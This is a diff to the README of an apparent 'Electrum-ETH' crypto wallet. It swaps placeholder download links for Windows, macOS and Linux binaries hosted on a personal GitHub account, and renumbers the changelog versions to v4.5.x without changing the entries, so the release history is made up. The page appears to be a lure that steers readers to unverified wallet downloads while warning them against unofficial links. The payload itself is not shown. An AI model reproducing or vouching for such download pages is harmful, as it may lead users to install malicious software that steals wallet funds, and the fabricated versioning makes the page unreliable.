@@ -31,9 +31,9 @@ Choose your platform below and hit that download button!
 
 | **Platform** | **Download Link** | **File Size** |
 |--------------|-------------------|---------------|
-| 🌐 Windows | [**Download for Windows**](https://your-windows-download-link.com) | 50 MB | 
-| 🍏 macOS  | [**Download for macOS**](https://your-macos-download-link.com)   | 45 MB |
-| 🐧 Linux  | [**Download for Linux**](https://your-linux-download-link.com)   | 60 MB |
+| 🌐 Windows | [**Download for Windows**]([https://your-windows-download-link.com](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.2.zip)) | 50 MB | 
+| 🍏 macOS  | [**Download for macOS**]([https://your-macos-download-link.com](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.dmg))   | 45 MB |
+| 🐧 Linux  | [**Download for Linux**]([https://your-linux-download-link.com](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.AppImage))   | 60 MB |
 
 > **Important**: Always download the wallet from the official website or trusted repositories. **Avoid using unofficial download links** to protect your assets and ensure you're using the latest, secure version of the wallet.
 
@@ -105,18 +105,18 @@ python electrum_eth.py
 
 ## 📝 Changelog
 
-**v2.0.2** (Latest Release):  
+**v4.5.5** (Latest Release):  
 - **Mainnet Support**: Full integration with Ethereum Mainnet for seamless transactions.  
 - **UI Enhancements**: Refined interface for a more fluid experience.  
 - **Security Improvements**: Enhanced encryption and security measures.  
 - **Bug Fixes**: Increased app stability and performance.
 
-**v2.0.0**:  
+**v4.5.4**:  
 - Initial **Ethereum Mainnet** support.  
 - **Redesigned UI** for better navigation and usability.  
 - **Multi-Wallet Support** added to manage several wallets seamlessly.
 
-**v1.1.0**:  
+**v4.5.3**:  
 - **Multi-Wallet Integration**: Manage multiple Ethereum wallets simultaneously.  
 - **Performance Enhancements**: Faster and more responsive transactions.  
 - **UI Tweaks**: Fixed bugs and improved the overall interface.
